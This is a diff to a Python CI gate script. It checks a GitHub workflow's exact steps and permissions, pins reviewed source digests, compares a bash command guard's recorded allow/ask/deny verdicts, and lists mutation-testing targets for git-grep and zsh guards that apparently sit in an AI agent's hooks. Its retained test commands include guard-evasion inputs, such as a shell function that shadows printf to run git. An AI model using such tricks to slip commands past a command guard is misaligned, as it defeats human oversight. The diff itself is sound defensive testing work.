+        ('--manifest "$MANIFEST"', "manifest argument"),
+    )
+    for needle, label in required_once:
+        if publication.count(needle) != 1:
+            return f"publication workflow {label} is absent or duplicated"
+    permissions = _yaml_mapping_block(publication, "    permissions:")
+    permission_lines = {
+        line.strip() for line in permissions.splitlines()[1:] if line.strip()
+    }
+    if permission_lines != {"contents: read", "pull-requests: read"}:
+        return "publication workflow job permissions are not exactly read-only"
+    step_headers = [
+        line.strip()
+        for line in publication.splitlines()
+        if line.strip() and not line.lstrip().startswith("#")
+        and len(line) - len(line.lstrip(" ")) == 6
+        and (line.strip() == "-" or line.strip().startswith("- "))
+    ]
+    if step_headers != [
+            "- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+            "- uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97",
+            "- name: frozen publication still matches the live pull request"]:
+        return "publication workflow step inventory is not exactly ordered and closed"
+    checkout_step = _yaml_mapping_block(
+        publication,
+        "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+    )
+    checkout_fields = [
+        line.strip()
+        for line in checkout_step.splitlines()[1:]
+        if line.strip() and not line.lstrip().startswith("#")
+        and len(line) - len(line.lstrip(" ")) == 8
+    ]
+    checkout_with = _yaml_mapping_block(checkout_step, "        with:")
+    checkout_values = [
+        line.strip()
+        for line in checkout_with.splitlines()[1:]
+        if line.strip() and not line.lstrip().startswith("#")
+    ]
+    if checkout_fields != ["with:"] or checkout_values != [
+            "persist-credentials: false"]:
+        return "publication workflow checkout step is not exactly unconditional at PR head"
+    setup_step = _yaml_mapping_block(
+        publication,
+        "      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97",
+    )
+    setup_fields = [
+        line.strip()
+        for line in setup_step.splitlines()[1:]
+        if line.strip() and not line.lstrip().startswith("#")
+        and len(line) - len(line.lstrip(" ")) == 8
+    ]
+    setup_with = _yaml_mapping_block(setup_step, "        with:")
+    setup_values = [
+        line.strip()
+        for line in setup_with.splitlines()[1:]
+        if line.strip() and not line.lstrip().startswith("#")
+    ]
+    if setup_fields != ["with:"] or setup_values != ["python-version: 3.13.14"]:
+        return "publication workflow setup-python step is not exactly unconditional"
+    verification_step = _yaml_mapping_block(
+        publication, "      - name: frozen publication still matches the live pull request")
+    if not verification_step:
+        return "publication workflow verification step is absent or duplicated"
+    step_fields = [
+        line.strip()
+        for line in verification_step.splitlines()[1:]
+        if line.strip() and not line.lstrip().startswith("#")
+        and len(line) - len(line.lstrip(" ")) == 8
+    ]
+    if step_fields != ["env:", "run: |"]:
+        return (
+            "publication workflow verification step fields are not exactly "
+            "unconditional env and run"
+        )
+    env_block = _yaml_mapping_block(verification_step, "        env:")
+    env_values = [
+        line.strip()
+        for line in env_block.splitlines()[1:]
+        if line.strip() and not line.lstrip().startswith("#")
+    ]
+    if env_values != [
+            "GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}",
+            "PR_NUMBER: ${{ github.event.pull_request.number }}",
+            "HEAD_SHA: ${{ github.event.pull_request.head.sha }}"]:
+        return "publication workflow verifier environment is not exactly PR-scoped"
+    run_block = _yaml_mapping_block(verification_step, "        run: |")
+    commands = tuple(
+        line.strip()
+        for line in run_block.splitlines()[1:]
+        if line.strip() and not line.lstrip().startswith("#")
+    )
+    expected_commands = (
+        'MANIFEST="contracts/review/pr-$PR_NUMBER/frozen-publication.json"',
+        'if [ ! -f "$MANIFEST" ]; then',
+        'echo "no frozen publication registered for PR $PR_NUMBER at $MANIFEST"',
+        "exit 1",
+        "fi",
+        "python3 tools/verify-review-publication.py pr-snapshot "
+        '--repo "$GITHUB_REPOSITORY" --pr "$PR_NUMBER" '
+        '--expected-head "$HEAD_SHA" --manifest "$MANIFEST"',
+    )
+    if commands != expected_commands:
+        return (
+            "publication workflow verifier command sequence is not exact and "
+            "failure-propagating"
+        )
+    return ""
+
+
+DEFAULT_CHILD_TIMEOUT_SECONDS = 120
+# A hosted macOS run measured the full harness at about 138 seconds before
+# this gate launched it a second time.  A shared 120-second ceiling therefore killed a
+# passing harness and converted it into a missing receipt.  Keep the exceptional budget
+# attached to the exact expensive command; the 240-second ceiling is bounded headroom over
+# that observation, not a validated performance target for every host.
+HARNESS_CI_TIMEOUT_SECONDS = 240
+
+
+def child_timeout_seconds(argv: Sequence[str]) -> float:
+    """Return the bounded deadline for one exact registered child command."""
+    if tuple(argv) == (sys.executable, "hooks/harness_check.py", "--ci"):
+        return HARNESS_CI_TIMEOUT_SECONDS
+    return DEFAULT_CHILD_TIMEOUT_SECONDS
+
+
+def _timeout_stderr_tail(value) -> str:
+    """Normalize TimeoutExpired stderr from text and byte subprocess implementations."""
+    if value is None:
+        return ""
+    if isinstance(value, bytes):
+        return value.decode("utf-8", "replace")[-2000:]
+    return str(value)[-2000:]
+
+
+def run_command(argv: Sequence[str]) -> Result:
+    timeout_seconds = child_timeout_seconds(argv)
+    try:
+        completed = subprocess.run(
+            list(argv),
+            cwd=ROOT,
+            capture_output=True,
+            text=True,
+            timeout=timeout_seconds,
+        )
+    except subprocess.TimeoutExpired as expired:
+        # Uncaught, this left the gate with a traceback and no receipt, which reads as a
+        # tooling crash rather than as the child that ran out of time.
+        return Result(
+            1, "",
+            f"child exceeded {timeout_seconds}s: {' '.join(argv)}\n"
+            f"{_timeout_stderr_tail(expired.stderr)}")
     return Result(completed.returncode, completed.stdout, completed.stderr)
 
 
@@ -191,7 +956,7 @@ def command_specs(render_root: Path) -> List[Tuple[List[str], ReceiptSpec]]:
                 re.compile(
                     r"^EVAL-VALIDATE-SUMMARY scenarios=(?P<scenarios>\d+) "
                     r"skills=(?P<skills>\d+) failures=(?P<failures>\d+) "
-                    r"exit=(?P<exit>\d+)$"
+                    r"scope=shape-only exit=(?P<exit>\d+)$"
                 ),
                 lambda match, code: (
                     f"eval corpus shrank: scenarios={match.group('scenarios')} "
@@ -236,6 +1001,1708 @@ def command_specs(render_root: Path) -> List[Tuple[List[str], ReceiptSpec]]:
     ]
 
 
+def floor_registry_error() -> str:
+    """Return drift between this gate and the imported harness registry."""
+    import importlib.util as _il
+    try:
+        spec = _il.spec_from_file_location("_ci_gate_harness", ROOT / "hooks/harness_check.py")
+        if spec is None or spec.loader is None:
+            return "cannot load hooks/harness_check.py for floor comparison"
+        harness = _il.module_from_spec(spec)
+        spec.loader.exec_module(harness)
+        harness_floors = {
+            name: floor for name, _command, floor in harness.SELFTEST_SUITES
+        }
+        harness_floors["harness_check"] = harness.SELFTEST_FLOOR
+    except Exception as exc:
+        return f"cannot import harness floor registry: {exc!r}"
+    drift = {
+        suite: (floor, harness_floors.get(suite))
+        for suite, floor in SUITE_FLOORS.items()
+        if harness_floors.get(suite) != floor
+    }
+    return f"suite floor registry drift: {drift}" if drift else ""
+
+
+def hook_budget_error(*, settings_data=None, codex_data=None, budget=None) -> str:
+    """Return drift between registered hook timeouts and the guard's inner deadline."""
+    try:
+        spec = importlib.util.spec_from_file_location(
+            "_ci_gate_git_guard", ROOT / "hooks/guards/git_grep_engine_guard.py")
+        if spec is None or spec.loader is None:
+            return "cannot load git_grep_engine_guard.py for hook-budget comparison"
+        guard = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(guard)
+        if settings_data is None:
+            settings_data = json.loads((ROOT / "settings.json").read_text(encoding="utf-8"))
+        if codex_data is None:
+            codex_data = json.loads(
+                (ROOT / "hooks/hooks.json").read_text(encoding="utf-8"))
+        return guard.hook_timeout_contract(
+            settings_data=settings_data, codex_data=codex_data, budget=budget)
+    except Exception as exc:
+        return f"cannot verify hook-budget contract: {exc!r}"
+
+
+DECISION_GOLDEN = ROOT / "contracts/goldens/guard-decisions.json"
+DECISION_WRITER = ROOT / "tools/write-decision-golden.py"
+RETAINED_DECISION_COMMANDS = ROOT / "contracts/goldens/retained-guard-commands.json"
+SUITE_SOURCE_GOLDEN = ROOT / "contracts/goldens/suite-sources.json"
+HARNESS_SOURCE = ROOT / "hooks/harness_check.py"
+REPOSITORY_OWNERSHIP_SOURCE = ROOT / "tools/repository_ownership.py"
+DECISION_CORPUS_FLOOR = 975
+DECISION_WRITER_SHA256 = "8c4180468fc05a88c69fafba3a79f2387f5df2d1aa728def1670f5497a442e9d"
+RETAINED_DECISION_SCHEMA_VERSION = 1
+RETAINED_DECISION_NOTE = (
+    "reviewed decision commands retained after their originating fixtures left the "
+    "current source; append-only unless a deliberate retirement changes the independent "
+    "gate contract"
+)
+EXPECTED_RETAINED_DECISION_COMMANDS = (
+    "=/usr/bin/git grep -E 'harness\\b' -- README.md",
+    "==/usr/bin/git grep -E 'harness\\b' -- README.md",
+    "printf '%s\\n' 'printf() { git \"$@\"; }' git grep -E 'harness\\b' -- README.md",
+    "printf '%s\\n' 'printf() { git \"$@\"; }' git grep -nE 'harness\\b' -- README.md",
+    "printf '%s\\n' 'printf() { git \"$@\"; }' git show HEAD:README.md",
+)
+
+
+def _json_without_duplicate_keys(path: Path):
+    """Load JSON while rejecting duplicate object keys hidden by ordinary json.loads."""
+    def unique_object(pairs):
+        value = {}
+        for key, item in pairs:
+            if key in value:
+                raise ValueError(f"duplicate JSON object key {key!r}")
+            value[key] = item
+        return value
+
+    return json.loads(path.read_text(encoding="utf-8"), object_pairs_hook=unique_object)
+
+
+def decision_writer_source_error(source_bytes=None) -> str:
+    """Bind corpus derivation to the independently reviewed writer implementation."""
+    try:
+        source = DECISION_WRITER.read_bytes() if source_bytes is None else source_bytes
+    except OSError as exc:
+        return f"cannot read decision writer source: {exc}"
+    actual = hashlib.sha256(source).hexdigest()
+    if actual != DECISION_WRITER_SHA256:
+        return "tools/write-decision-golden.py differs from its reviewed source digest"
+    return ""
+
+
+def retained_decision_commands_error(data=None) -> str:
+    """Validate the topology-independent retained corpus against a closed set."""
+    try:
+        if data is None:
+            data = _json_without_duplicate_keys(RETAINED_DECISION_COMMANDS)
+    except (OSError, ValueError) as exc:
+        return f"cannot read retained decision commands: {exc}"
+    if not isinstance(data, dict):
+        return "retained decision command manifest is not an object"
+    required = {"schema_version", "note", "commands"}
+    if set(data) != required:
+        return "retained decision command manifest fields differ from the closed schema"
+    if data.get("schema_version") != RETAINED_DECISION_SCHEMA_VERSION:
+        return "retained decision command schema version differs"
+    if data.get("note") != RETAINED_DECISION_NOTE:
+        return "retained decision command note differs"
+    commands = data.get("commands")
+    if not isinstance(commands, list) or tuple(commands) != EXPECTED_RETAINED_DECISION_COMMANDS:
+        return "retained decision commands differ from the independent closed inventory"
+    return ""
+
+
+def harness_source_error(golden_data=None, source_bytes=None) -> str:
+    """Bind the harness this gate executes to the reviewed source registry.
+
+    ``harness_check.py`` cannot aggregate its own selftest without recursing, so its
+    source is absent from that script's C1 loop.  The outer gate executes both its
+    production and selftest modes and must bind those receipts independently; otherwise
+    a two-receipt stub can erase C2-C11 while preserving every process-level check here.
+    """
+    try:
+        if golden_data is None:
+            golden_data = _json_without_duplicate_keys(SUITE_SOURCE_GOLDEN)
+        suites = golden_data.get("suites") if isinstance(golden_data, dict) else None
+        expected = suites.get("harness_check") if isinstance(suites, dict) else None
+        if not isinstance(expected, str) or not re.fullmatch(r"[0-9a-f]{64}", expected):
+            return "suite source registry has no valid harness_check digest"
+        current = HARNESS_SOURCE.read_bytes() if source_bytes is None else source_bytes
+        actual = hashlib.sha256(current).hexdigest()
+    except (OSError, ValueError) as exc:
+        return f"cannot verify harness_check source: {exc}"
+    if actual != expected:
+        return "hooks/harness_check.py differs from its reviewed suite source digest"
+    return ""
+
+
+def repository_ownership_source_error(golden_data=None, source_bytes=None) -> str:
+    """Bind the ownership authority used by multiple scanners to reviewed bytes."""
+    try:
+        if golden_data is None:
+            golden_data = _json_without_duplicate_keys(SUITE_SOURCE_GOLDEN)
+        suites = golden_data.get("suites") if isinstance(golden_data, dict) else None
+        expected = suites.get("repository-ownership") if isinstance(suites, dict) else None
+        if not isinstance(expected, str) or not re.fullmatch(r"[0-9a-f]{64}", expected):
+            return "suite source registry has no valid repository-ownership digest"
+        current = (REPOSITORY_OWNERSHIP_SOURCE.read_bytes()
+                   if source_bytes is None else source_bytes)
+        actual = hashlib.sha256(current).hexdigest()
+    except (OSError, ValueError) as exc:
+        return f"cannot verify repository-ownership source: {exc}"
+    if actual != expected:
+        return "tools/repository_ownership.py differs from its reviewed suite source digest"
+    return ""
+
+
+def mutation_generator_source_error(golden_data=None, source_bytes=None) -> str:
+    """Bind the mutation generator to the reviewed source registry.
+
+    The three guards carry an authored digest here, so editing one reddens this gate until a
+    reviewer updates the registry in the same commit. The tool that MEASURES those guards had
+    no such binding: its only digest was ``generator_sha256`` inside the receipt it writes
+    itself, so editing the generator and regenerating in one commit moved both together and
+    the gate stayed green. A self-attesting measurement instrument is not attested.
+    """
+    try:
+        if golden_data is None:
+            golden_data = _json_without_duplicate_keys(SUITE_SOURCE_GOLDEN)
+        suites = golden_data.get("suites") if isinstance(golden_data, dict) else None
+        expected = suites.get("write-mutation-receipt") if isinstance(suites, dict) else None
+        if not isinstance(expected, str) or not re.fullmatch(r"[0-9a-f]{64}", expected):
+            return "suite source registry has no valid write-mutation-receipt digest"
+        current = ((ROOT / "tools/write-mutation-receipt.py").read_bytes()
+                   if source_bytes is None else source_bytes)
+        actual = hashlib.sha256(current).hexdigest()
+    except (OSError, ValueError) as exc:
+        return f"cannot verify write-mutation-receipt source: {exc}"
+    if actual != expected:
+        return ("tools/write-mutation-receipt.py differs from its reviewed suite source "
+                "digest; update its entry in the same commit and review that diff")
+    return ""
+
+
+def decision_golden_error(golden_data=None, decide=None, snapshot=None,
+                          contract=None, minimum_commands=None) -> str:
+    """Return drift between the recorded guard verdicts and what the guards now return.
+
+    Source digests pin bytes and floors ratchet counts; neither notices a DECISION
+    reversal, because a fixture and the code it grades move together. Forty-three fixture
+    expectations were rewritten on this branch with every suite green. A verdict change
+    now has to appear here too, one reviewable line per command.
+    """
+    production_contract = snapshot is None or contract is None
+    try:
+        if golden_data is None:
+            golden_data = _json_without_duplicate_keys(DECISION_GOLDEN)
+        if production_contract:
+            writer_problem = decision_writer_source_error()
+            if writer_problem:
+                return writer_problem
+            retained_problem = retained_decision_commands_error()
+            if retained_problem:
+                return retained_problem
+            writer_spec = importlib.util.spec_from_file_location(
+                "_ci_gate_decision_writer", DECISION_WRITER)
+            if writer_spec is None or writer_spec.loader is None:
+                return "cannot load write-decision-golden.py for corpus comparison"
+            writer = importlib.util.module_from_spec(writer_spec)
+            writer_spec.loader.exec_module(writer)
+            snapshot = writer.corpus_snapshot()
+            contract = {
+                "schema_version": writer.SCHEMA_VERSION,
+                "generated_by": writer.GENERATED_BY,
+                "note": writer.NOTE,
+                "corpus": writer.CORPUS_DESCRIPTION,
+                "top_level_keys": tuple(writer.TOP_LEVEL_KEYS),
+                "exclusion_keys": tuple(writer.EXCLUSION_KEYS),
+            }
+        if minimum_commands is None:
+            minimum_commands = DECISION_CORPUS_FLOOR if production_contract else 1
+        if decide is None:
+            for path in (ROOT / "hooks", ROOT / "hooks" / "guards"):
+                if str(path) not in sys.path:
+                    sys.path.insert(0, str(path))
+            spec = importlib.util.spec_from_file_location(
+                "_ci_gate_bash_guard", ROOT / "hooks/bash_command_guard.py")
+            if spec is None or spec.loader is None:
+                return "cannot load bash_command_guard.py for the decision golden"
+            module = importlib.util.module_from_spec(spec)
+            spec.loader.exec_module(module)
+            decide = module.decide
+    except Exception as exc:
+        return f"cannot verify the decision golden: {exc!r}"
+
+    if not isinstance(golden_data, dict):
+        return "the decision golden root is not an object"
+    problems = []
+    required = set(contract["top_level_keys"])
+    actual = set(golden_data)
+    if actual != required:
+        problems.append(
+            f"top-level fields missing={sorted(required - actual)} "
+            f"unexpected={sorted(actual - required)}")
+    for field in ("schema_version", "generated_by", "note", "corpus"):
+        if golden_data.get(field) != contract[field]:
+            problems.append(f"{field} does not match the closed generator contract")
+    exclusions = golden_data.get("exclusions")
+    if not isinstance(exclusions, dict):
+        problems.append("exclusions is not an object")
+    else:
+        expected_exclusion_fields = set(contract["exclusion_keys"])
+        actual_exclusion_fields = set(exclusions)
+        if actual_exclusion_fields != expected_exclusion_fields:
+            problems.append(
+                "exclusion fields "
+                f"missing={sorted(expected_exclusion_fields - actual_exclusion_fields)} "
+                f"unexpected={sorted(actual_exclusion_fields - expected_exclusion_fields)}")
+        if exclusions != snapshot["exclusions"]:
+            problems.append("recorded exclusions differ from the exact generated corpus")
+    recorded = golden_data.get("decisions")
+    if not isinstance(recorded, dict) or not recorded:
+        problems.append("the decision golden records no commands")
+        recorded = {}
+    expected_commands = set(snapshot["commands"])
+    recorded_commands = set(recorded)
+    if len(expected_commands) < minimum_commands:
+        problems.append(
+            f"generated decision corpus {len(expected_commands)} is below floor "
+            f"{minimum_commands}")
+    missing_commands = sorted(expected_commands - recorded_commands, key=repr)
+    foreign_commands = sorted(recorded_commands - expected_commands, key=repr)
+    if missing_commands or foreign_commands:
+        problems.append(
+            f"decision corpus missing={missing_commands[:4]} "
+            f"foreign={foreign_commands[:4]}")
+    invalid = sorted(
+        (repr(command), repr(outcome)) for command, outcome in recorded.items()
+        if not isinstance(command, str)
+        or not isinstance(outcome, str)
+        or outcome not in {"allow", "ask", "deny"}
+    )
+    if invalid:
+        problems.append(f"invalid decision entries={invalid[:4]}")
+    if problems:
+        return "decision golden schema/corpus mismatch: " + "; ".join(problems[:8])
+
+    drift = []
+    for command in snapshot["commands"]:
+        expected = recorded[command]
+        try:
+            observed = decide(command)[0]
+        except BaseException as exc:
+            observed = f"raised {type(exc).__name__}"
+        if observed != expected:
+            drift.append((command, expected, observed))
+    if not drift:
+        return ""
+    shown = "; ".join(f"{command[:60]!r}: {was} -> {now}" for command, was, now in drift[:6])
+    return (f"guard decisions drifted from the recorded golden on {len(drift)} of "
+            f"{len(recorded)} commands ({shown}"
+            f"{'; ...' if len(drift) > 6 else ''}). If the change is intended, run "
+            f"tools/write-decision-golden.py in the same commit and review that diff")
+
+
+MUTATION_RECEIPT = ROOT / "contracts/goldens/mutation-receipt.json"
+MUTATION_SUMMARY = ROOT / "contracts/goldens/mutation-summary.md"
+# 80 of these are the debt this branch already carried. The other 8 are the removal
+# direction of ENV_SPLIT_ESCAPES, the env -S escape table: removing an entry makes the
+# splitter REFUSE that sequence, which is strictly stricter, so an element sweep that
+# only removes cannot express a kill for them. Two of its ten are caught, by fixtures
+# that depend on the removed escape producing a literal backslash.
+MUTATION_SURVIVOR_DEBT_CEILING = 88
+MUTATION_PLAN_FLOOR = 368
+# Kills scored only because the recorded check count moved, with no assertion failing. A
+# guard that increments its counter once per element of the collection under mutation moves
+# that count on any removal, so such a kill is decided by loop structure before any probe
+# runs and inflates `caught` without evidence. This was 17 of the 22 CROSS_VERSION_ALIAS_PROOF
+# elements, thirteen of which moved a real merged verdict from deny to ask while every gate
+# stayed green. Fixtures now assert those verdicts, and an arithmetic kill no longer preempts
+# the merged suite that sees them, so the count fell from 17 to zero on the authoring host.
+# The ceiling is one rather than zero because whether an assertion fires can depend on the
+# environment: deleting "W" from MOD_UNMODELLED reddens a probe on a zsh that consumes that
+# letter as a modifier and only moves the check count on a zsh that does not, so the CI
+# runner observes one such kill where this host observes none. The writer owns the ceiling
+# because it evaluates fresh fragments before projecting host-observed fields away; this gate
+# reads that same value while validating the tracked authoring receipt.
+# Declared additions, pinned here independently of the generator. The element sweep only
+# REMOVES members, and removal makes a collection that grants an exemption stricter, so the
+# generated sweep cannot express the direction these fail in. Each entry must be caught; a
+# survivor is a live fail-open rather than coverage debt. Pinned so an entry cannot be
+# dropped without this gate saying so.
+# The committed receipt's kill reasons are dropped from the cross-host comparison, because
+# whether an assertion fires can differ by environment. Dropped from comparison also means
+# unfalsifiable: relabelling every recorded kill as a real assertion and emptying the tally
+# passed both this gate and the CI aggregate, which is exactly the overstatement the reason
+# field exists to prevent. Pinning the committed set by identity puts it back under review --
+# laundering it now requires editing this constant, which a reader sees. This constrains the
+# committed artifact only; it does not claim any host observes the same set.
+# Empty because the committed receipt was measured on a host whose zsh consumes "W" as a
+# modifier, so that mutation reddens a real probe there. The committed receipt currently
+# records no unasserted kills. Pinning the exact identity set makes a future non-empty
+# committed observation review-visible; fresh aggregation separately derives and applies
+# the writer-owned ceiling before comparing platform-stable outcomes.
+EXPECTED_UNASSERTED_KILLS: set[tuple] = set()
+EXPECTED_MUTATION_ADDITIONS = {
+    (
+        "hooks/guards/git_grep_engine_guard.py", "_GIT_TERMINAL_OPTIONS", "set",
+        "--icase-pathspecs", "a non-terminating git global is treated as terminal", (),
+    ),
+    (
+        "hooks/guards/git_grep_engine_guard.py", "_GIT_GLOBAL_OPTIONS_WITH_VALUES", "set",
+        "--no-advice", "a valueless git global is treated as value-taking", (),
+    ),
+    (
+        "hooks/guards/git_grep_engine_guard.py", "GREP_SHORT_PATTERN_ARG", "set", "w",
+        "a boolean grep short option is treated as taking the pattern", (),
+    ),
+    (
+        "hooks/guards/git_grep_engine_guard.py", "GREP_SHORT_OPTIONAL_VALUE", "set", "w",
+        "a boolean grep short option is treated as optionally valued", (),
+    ),
+}
+EXPECTED_MUTATION_COLLECTIONS = {
+    ("hooks/bash_command_guard.py", "GUARDS"): 2,
+    ("hooks/bash_command_guard.py", "RANK"): 3,
+    ("hooks/bash_command_guard.py", "RUNTIMES"): 2,
+    ("hooks/guards/git_grep_engine_guard.py", "CONFIG_ENGINE"): 7,
+    ("hooks/guards/git_grep_engine_guard.py", "CONTROL_KEYWORDS"): 12,
+    ("hooks/guards/git_grep_engine_guard.py", "CROSS_VERSION_ALIAS_PROOF"): 22,
+    ("hooks/guards/git_grep_engine_guard.py", "ENV_SPLIT_ESCAPES"): 10,
+    ("hooks/guards/git_grep_engine_guard.py", "EXEC_WRAPPERS"): 6,
+    ("hooks/guards/git_grep_engine_guard.py", "GIT_HAZARD_SUBCOMMANDS"): 17,
+    ("hooks/guards/git_grep_engine_guard.py", "GIT_LOG_ENGINE_TOKENS"): 7,
+    ("hooks/guards/git_grep_engine_guard.py", "GIT_LOG_GREP_SUBCOMMANDS"): 3,
+    ("hooks/guards/git_grep_engine_guard.py", "GIT_LOG_PATTERN_OPTIONS"): 3,
+    ("hooks/guards/git_grep_engine_guard.py", "GREP_LONG_BOOLEAN_OPTIONS"): 37,
+    ("hooks/guards/git_grep_engine_guard.py", "GREP_LONG_ENGINE"): 4,
+    ("hooks/guards/git_grep_engine_guard.py", "GREP_LONG_NEGATED_ENGINE"): 4,
+    ("hooks/guards/git_grep_engine_guard.py", "GREP_LONG_OPTIONAL_VALUE"): 2,
+    ("hooks/guards/git_grep_engine_guard.py", "GREP_LONG_OPTION_NAMES"): 6,
+    ("hooks/guards/git_grep_engine_guard.py", "GREP_LONG_REQUIRED_VALUE"): 6,
+    ("hooks/guards/git_grep_engine_guard.py", "GREP_SHORT_ENGINE"): 4,
+    ("hooks/guards/git_grep_engine_guard.py", "GREP_SHORT_NOARG"): 17,
+    ("hooks/guards/git_grep_engine_guard.py", "GREP_SHORT_OPTIONAL_VALUE"): 1,
+    ("hooks/guards/git_grep_engine_guard.py", "GREP_SHORT_PATTERN_ARG"): 2,
+    ("hooks/guards/git_grep_engine_guard.py", "GREP_SHORT_VALUE"): 4,
+    ("hooks/guards/git_grep_engine_guard.py", "PCRE_ESCAPE_LETTERS"): 21,
+    ("hooks/guards/git_grep_engine_guard.py", "REV_PATH_SUBCOMMANDS"): 15,
+    ("hooks/guards/git_grep_engine_guard.py", "SHELLS"): 5,
+    ("hooks/guards/git_grep_engine_guard.py", "SHELL_NON_FORWARDING_COMMANDS"): 2,
+    ("hooks/guards/git_grep_engine_guard.py", "TRUSTED_EXTERNAL_NON_FORWARDING_COMMANDS"): 3,
+    ("hooks/guards/git_grep_engine_guard.py", "WRAPPER_TERMINAL_OPTIONS"): 2,
+    ("hooks/guards/git_grep_engine_guard.py", "_CLOSED_LIMITS"): 5,
+    ("hooks/guards/git_grep_engine_guard.py", "_GIT_GLOBAL_OPTIONS_WITH_VALUES"): 8,
+    ("hooks/guards/git_grep_engine_guard.py", "_GIT_TERMINAL_OPTIONS"): 8,
+    ("hooks/guards/zsh_rev_modifier_guard.py", "MODS"): 13,
+    ("hooks/guards/zsh_rev_modifier_guard.py", "MOD_MEANING"): 13,
+    ("hooks/guards/zsh_rev_modifier_guard.py", "MOD_PREFIXES"): 4,
+    ("hooks/guards/zsh_rev_modifier_guard.py", "MOD_UNMODELLED"): 1,
+}
+EXPECTED_MUTATION_SITES = {
+    ("hooks/announced_work_guard.py", "adjectival group ambiguity guard dropped"),
+    ("hooks/announced_work_guard.py", "adjectival group modifier state dropped"),
+    ("hooks/announced_work_guard.py", "adjectival group subject-resume bridge dropped"),
+    ("hooks/announced_work_guard.py", "attached period classification dropped"),
+    ("hooks/announced_work_guard.py", "bounded post-group context bridge dropped"),
+    ("hooks/announced_work_guard.py", "colon bridge same-line boundary dropped"),
+    ("hooks/announced_work_guard.py", "colon adjectival group deferral dropped"),
+    ("hooks/announced_work_guard.py", "colon grouped-result tail resolution dropped"),
+    ("hooks/announced_work_guard.py", "colon predicate bridge classification dropped"),
+    ("hooks/announced_work_guard.py", "colon predicate-modifier bridge dropped"),
+    ("hooks/announced_work_guard.py", "colon-to-group predicate bridge dropped"),
+    ("hooks/announced_work_guard.py", "comma adjective distinction dropped"),
+    ("hooks/announced_work_guard.py", "comma predicate continuation dropped"),
+    ("hooks/announced_work_guard.py", "decorated colon classification dropped"),
+    ("hooks/announced_work_guard.py", "escaped group delimiter handling dropped"),
+    ("hooks/announced_work_guard.py", "hard separator classification dropped"),
+    ("hooks/announced_work_guard.py", "grouped historical subject ownership dropped"),
+    ("hooks/announced_work_guard.py", "grouped historical compound traversal dropped"),
+    ("hooks/announced_work_guard.py", "grouped historical compound bound dropped"),
+    ("hooks/announced_work_guard.py", "grouped latest-run distinction dropped"),
+    ("hooks/announced_work_guard.py", "inline-code group recognition dropped"),
+    ("hooks/announced_work_guard.py", "open-group association dropped"),
+    ("hooks/announced_work_guard.py", "outer-group closure signal dropped"),
+    ("hooks/announced_work_guard.py", "post-group predicate modifier bridge dropped"),
+    ("hooks/announced_work_guard.py", "post-group context object validation dropped"),
+    ("hooks/announced_work_guard.py", "post-group subject replacement guard dropped"),
+    ("hooks/announced_work_guard.py", "productive complement tokens dropped"),
+    ("hooks/announced_work_guard.py", "straight-single outer predicate closure dropped"),
+    ("hooks/announced_work_guard.py", "unexpected judge exception block dropped"),
+    ("hooks/announced_work_guard.py", "whole complement-token membership dropped"),
+    ("hooks/announced_work_guard.py", "whole report-token membership dropped"),
+    ("hooks/announced_work_guard.py", "URL punctuation bypass dropped"),
+    ("hooks/announced_work_guard.py", "URL trailing-punctuation trim dropped"),
+    ("hooks/announced_work_guard.py", "URL prose-release boundary dropped"),
+    ("hooks/announced_work_guard.py", "URL semantic-token bypass dropped"),
+    ("tools/repository_ownership.py", "effective core.worktree scalar lookup dropped"),
+    ("hooks/bash_command_guard.py", "merged guard function cache scope dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "alias shadowing failure channel dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "attached exec argv-zero grammar dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "builtin trap wrapper adoption dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "budget wrap deleted"),
+    ("hooks/guards/git_grep_engine_guard.py", "candidate authority forced trusted"),
+    ("hooks/guards/git_grep_engine_guard.py", "decision-budget checkpoint neutered"),
+    ("hooks/guards/git_grep_engine_guard.py", "dynamic source adoption removed"),
+    ("hooks/guards/git_grep_engine_guard.py", "dynamic source command identity dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "exec single-dash terminator dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "function record decision cache dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "function record cache cap raised"),
+    ("hooks/guards/git_grep_engine_guard.py", "git config count cap dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "git config loop budget dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "git hazard union adoption dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "guarded-tail predicate rescans per word"),
+    ("hooks/guards/git_grep_engine_guard.py",
+     "invoked alias body state transition dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "native command checked after alias"),
+    ("hooks/guards/git_grep_engine_guard.py", "nested source shell identity dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "process substitution loses typed operand"),
+    ("hooks/guards/git_grep_engine_guard.py", "shell alias depth context corrupted"),
+    ("hooks/guards/git_grep_engine_guard.py", "shell alias forwarding dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "source alias invocation dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "source alias wrapper resolution dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "source alias body traversal dropped"),
+    ("hooks/guards/git_grep_engine_guard.py",
+     "ordinary shell alias Git classification dropped"),
+    ("hooks/guards/git_grep_engine_guard.py",
+     "executed alias Git traversal dropped"),
+    ("hooks/guards/git_grep_engine_guard.py",
+     "nonordinary alias mode tracking dropped"),
+    ("hooks/guards/git_grep_engine_guard.py",
+     "nonordinary alias use detection dropped"),
+    ("hooks/guards/git_grep_engine_guard.py",
+     "declared helper function alias traversal dropped"),
+    ("hooks/guards/git_grep_engine_guard.py",
+     "source alias embedded operand classification dropped"),
+    ("hooks/guards/git_grep_engine_guard.py",
+     "source alias dynamic command detection dropped"),
+    ("hooks/guards/git_grep_engine_guard.py",
+     "source alias invocation lookup bypass dropped"),
+    ("hooks/guards/git_grep_engine_guard.py",
+     "source alias state lookup bypass dropped"),
+    ("hooks/guards/git_grep_engine_guard.py",
+     "same-shell alias mutation wrapper resolution dropped"),
